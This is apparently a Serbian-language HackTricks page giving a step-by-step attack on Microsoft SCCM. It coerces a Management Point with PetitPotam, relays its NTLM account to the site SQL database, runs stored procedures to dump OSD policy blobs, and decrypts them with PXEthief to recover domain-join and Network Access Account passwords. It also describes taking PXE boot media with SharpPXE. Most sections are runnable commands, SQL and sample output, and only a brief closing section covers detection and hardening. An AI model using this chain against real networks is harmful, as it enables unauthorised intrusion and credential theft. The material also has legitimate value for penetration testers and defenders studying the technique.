# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## Ukratko
Izazivanjem da **System Center Configuration Manager (SCCM) Management Point (MP)** izvrši autentifikaciju preko SMB/RPC i **relaying** tog NTLM machine account-a ka **site database (MSSQL)** bazi dobijate prava `smsdbrole_MP` / `smsdbrole_MPUserSvc`.  Ove uloge vam omogućavaju pozivanje skupa stored procedures koje otkrivaju **Operating System Deployment (OSD)** policy blob-ove (Network Access Account kredencijale, Task-Sequence promenljive itd.).  Blob-ovi su hex-encoded/encrypted, ali mogu da se dekodiraju i dešifruju pomoću **PXEthief**, čime se dobijaju secrets u plaintext obliku.

Lanac na visokom nivou:
1. Otkrijte MP i site DB ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Pokrenite `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Izazovite autentifikaciju MP-a pomoću **PetitPotam**, PrinterBug, DFSCoerce itd.
4. Preko SOCKS proxy-ja se povežite pomoću `mssqlclient.py -windows-auth` kao relayed **<DOMAIN>\\<MP-host>$** account.
5. Izvršite:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (ili `MP_GetPolicyBodyAfterAuthorization`)
6. Uklonite `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Secrets kao što su `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` itd. mogu se povratiti bez pristupanja PXE-u ili klijentima.<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Enumeracija unauthenticated MP endpoint-a
MP ISAPI ekstenzija **GetAuth.dll** izlaže nekoliko parametara koji ne zahtevaju autentifikaciju (osim ako je site PKI-only):<sup>[[1]](#references)</sup>

| Parameter | Svrha |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Vraća public key site signing certificate-a + GUID-ove *x86* / *x64* uređaja **All Unknown Computers**. |
| `MPLIST` | Izlistava svaki Management-Point u site-u. |
| `SITESIGNCERT` | Vraća Primary-Site signing certificate (identifikujte site server bez LDAP-a). |

Preuzmite GUID-ove koji će služiti kao **clientID** za kasnije DB upite:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Relay MP machine account-a ka MSSQL-u
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Kada se coercion aktivira, trebalo bi da vidite nešto poput:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identifikujte OSD policies pomoću stored procedures
Povežite se kroz SOCKS proxy (podrazumevani port je 1080):<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Prebacite se na bazu podataka **CM_<SiteCode>** (koristite trocifreni kod lokacije, npr. `CM_001`).

### 3.1  Pronalaženje GUID-ova nepoznatih računara (opciono)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Izlistavanje dodeljenih politika
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Svaki red sadrži `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.

Fokusirajte se na policies:
* **NAAConfig** – kredencijale za Network Access Account
* **TS_Sequence** – promenljive Task Sequence (OSDJoinAccount/Password)
* **CollectionSettings** – može da sadrži run-as naloge

### 3.3  Preuzimanje kompletnog body-ja
Ako već imate `PolicyID` i `PolicyVersion`, možete preskočiti zahtev za clientID koristeći:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> VAŽNO: U SSMS-u povećajte „Maximum Characters Retrieved“ (>65535) ili će blob biti skraćen.

---

## 4. Dekodiranje i dešifrovanje blob-a
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Primer oporavljenih tajni:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Relevantne SQL uloge i procedure
Nakon relay-a, prijava se mapira na:<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Ove uloge imaju EXEC dozvole nad desetinama procedura, a ključne koje se koriste u ovom napadu su:

| Stored Procedure | Svrha |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Navodi policy-je primenjene na `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Vraća kompletno telo policy-ja. |
| `MP_GetListOfMPsInSiteOSD` | Vraća se putem `MPKEYINFORMATIONMEDIA` putanje. |

Kompletan spisak možete pregledati pomoću:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Prikupljanje PXE boot medija (SharpPXE)
* **PXE reply preko UDP/4011**: pošaljite PXE boot zahtev Distribution Point-u konfigurisanom za PXE. proxyDHCP odgovor otkriva boot putanje kao što su `SMSBoot\\x64\\pxe\\variables.dat` (encrypted config) i `SMSBoot\\x64\\pxe\\boot.bcd`, kao i opcioni encrypted key blob.<sup>[[4]](#references)</sup>
* **Preuzimanje boot artefakata putem TFTP-a**: koristite vraćene putanje za preuzimanje fajla `variables.dat` putem TFTP-a (unauthenticated). Fajl je mali (nekoliko KB) i sadrži encrypted media variables.
* **Decrypt ili crack**:
- Ako odgovor uključuje decryption key, prosledite ga alatu **SharpPXE** da direktno decryptuje `variables.dat`.
- Ako key nije obezbeđen (PXE media zaštićen custom password-om), SharpPXE generiše **Hashcat-compatible** `$sccm$aes128$...` hash za offline cracking. Nakon pronalaženja password-a, decryptujte fajl.
* **Parsiranje decrypted XML-a**: plaintext variables sadrže SCCM deployment metadata (**Management Point URL**, **Site Code**, media GUID-ove i druge identifikatore). SharpPXE ih parsira i ispisuje spremnu za pokretanje **SharpSCCM** komandu sa unapred popunjenim GUID/PFX/site parametrima za naknadnu abuse aktivnost.
* **Zahtevi**: potrebna je samo network reachability do PXE listener-a (UDP/4011) i TFTP; local admin privileges nisu potrebne.

---

## 7. Detekcija i hardening
1. **Nadgledajte MP logins** – svaki MP computer account koji se prijavljuje sa IP adrese koja nije njegov host ≈ relay.<sup>[[1]](#references)</sup>
2. Omogućite **Extended Protection for Authentication (EPA)** na site database-u (`PREVENT-14`).
3. Isključite nekorišćeni NTLM, zahtevajte SMB signing i ograničite RPC (
iste mitigacije koje se koriste protiv `PetitPotam`/`PrinterBug`).
4. Ojačajte MP ↔ DB komunikaciju pomoću IPSec-a / mutual-TLS-a.
5. **Ograničite PXE exposure** – ograničite UDP/4011 i TFTP firewall-om na trusted VLAN-ove, zahtevajte PXE password-e i generišite alert za TFTP downloads fajlova `SMSBoot\\*\\pxe\\variables.dat`.<sup>[[4]](#references)</sup>

---

## Takođe pogledajte
* Osnove NTLM relay-a:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse i post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

## Reference
- [1] [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)

{{#include ../../banners/hacktricks-training.md}}
